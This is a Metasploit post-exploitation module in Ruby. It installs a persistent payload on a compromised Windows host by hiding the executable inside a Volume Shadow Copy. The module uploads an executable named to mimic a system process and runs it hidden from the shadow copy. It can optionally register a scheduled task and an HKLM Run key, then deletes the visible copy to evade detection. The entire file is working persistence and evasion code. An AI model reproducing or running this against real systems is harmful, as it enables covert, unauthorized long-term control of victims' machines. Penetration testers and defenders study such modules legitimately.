##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/shadowcopy'
require 'msf/core/post/windows/priv'
require 'msf/core/post/common'

class Metasploit4 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ShadowCopy
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Registry

  def initialize(info={})

    super(update_info(info,
      'Name'                 => "Persistant Payload in Windows Volume Shadow Copy",
      'Description'          => %q{
        This module will attempt to create a persistant payload 
        in new volume shadow copy.This is based on the VSSOwn 
        Script originally posted by Tim Tomes and Mark Baggett.
        Works on win2k3 and later.
        },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => ['MrXors Mr.Xors<at>gmail.com'],
      'References'           => [
        [ 'URL', 'http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html' ],
        [ 'URL', 'http://www.irongeek.com/i.php?page=videos/hack3rcon2/tim-tomes-and-mark-baggett-lurking-in-the-shadows']]
    ))
    register_options(
      [
        OptString.new('VOLUME', [ true, 'Volume to make a copy of.', 'C:\\']),
        OptBool.new('EXECUTE', [ true, 'Run the .exe on the remote system.', true]),
        OptBool.new('SCHTASK', [ false, 'Create a schtask.exe for EXE.', false]),
        OptBool.new('RUNKEY', [ false, 'Create AutoRun Key on HKLM\Software\Microsoft\Windows\CurrentVersion\Run .', false]),
        OptInt.new('DELAY', [ false, 'Delay in Minutes for Reconnect attempt.Needs SCHTASK set to true to work.default delay is 1 minute.', 1]),
        OptString.new('RPATH', [ false, 'Path on remote system to place Executable.Example \\\\Windows\\\\Temp (DO NOT USE C:\\ in your RPATH!)', ]),
        OptString.new('PATH', [ true, 'Path to Executable on your local system.'])
      ], self.class)
  end
  
  def upload(session,file,trgloc = "")
    @clean_up = ""
    if not ::File.exists?(file)
      raise "File to Upload does not exists!"
    else
      if trgloc == ""
        location = "\\Windows\\Temp"
      else
        location = trgloc
      end
      ext = file[file.rindex(".") .. -1]
      if ext and ext.downcase == ".exe"
        file_name  = "svhost#{rand(100)}.exe"
        file_on_target = "#{location}\\#{file_name}"
      else  
        file_on_target = "#{location}\\TMP#{rand(100)}#{ext}"
      end
      print_status("Uploading #{file}....")
      begin
        session.fs.file.upload_file("#{file_on_target}","#{file}")
      rescue ::Rex::Post::Meterpreter::RequestError => e
        fail_with(Failure::NotFound, e.message)
      end
    end

    unless is_admin?
      print_error("This module requires admin privs to run")
      return
    end
    if is_uac_enabled?
      print_error("This module requires UAC to be bypassed first")
      return
    end
    unless start_vss
      return
    end
    id = create_shadowcopy(datastore['VOLUME'])
    if id
      print_good "Shadow Copy #{id} created!"
    end

    cmd = "cmd.exe /c vssadmin List Shadows\| find \"Shadow Copy Volume\""
    volume_data_id = [] 
    output = cmd_exec(cmd)
    output.each_line do |line|
      cmd_regex = /HarddiskVolumeShadowCopy\d{1,3}/.match("#{line}")
      volume_data_id = "#{cmd_regex}"
    end
    
    if datastore["EXECUTE"]
      print_good("Running Executable!")
      run_malware = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_data_id}\\#{location}\\#{file_name}", nil, {'Hidden' => true})
    end

    if datastore["SCHTASK"]
      sch_name = Rex::Text.rand_text_alpha(rand(8)+8)
      print_good("Creating Service..........")
      service_malware_go = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\schtasks.exe /create /sc minute /mo #{datastore["DELAY"]} /tn \"#{sch_name}\" /tr \\\\?\\GLOBALROOT\\Device\\#{volume_data_id}\\#{location}\\#{file_name}", nil, {'Hidden' => true})
      @clean_up << "execute -H -f cmd.exe -a \"/c schtasks.exe /delete /tn #{sch_name} /f\"\n"  
    end

    print_good("Deleting Malware #{location}\\#{file_name}!")
    delete_cmd = session.sys.process.execute("cmd.exe /c del #{location}\\#{file_name}", nil, {'Hidden' => true})
    delete_cmd.close
    print_good("Clean Up Complete.")

    if datastore["RUNKEY"]
      def write_to_reg(key,path_to_exe)
        nam = Rex::Text.rand_text_alpha(rand(8)+8)
        print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
        if(key)
          registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,path_to_exe,"REG_SZ")
          print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
          @clean_up << "reg  deleteval -k #{key}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v #{nam}\n"
        else
          print_error("Error: failed to open the registry key for writing")
        end
      end
      write_to_reg("HKLM", "\\\\?\\GLOBALROOT\\Device\\#{volume_data_id}\\#{location}\\#{file_name}")
    end

    def log_file(log_path = nil)
      host = session.sys.config.sysinfo["Computer"]  
      filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
      if log_path
        logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
      else
        logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
      end
      ::FileUtils.mkdir_p(logs)
      logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
      return logfile
    end

    clean_rc = log_file()
    file_local_write(clean_rc,@clean_up)
    print_status("Cleanup Meterpreter RC File: #{clean_rc}")  
    return file_on_target
  end

  def run
    print_good("Uploading Payload to machine.")
    upload(session,"#{datastore['PATH']}","#{datastore['RPATH']}")
  end

end
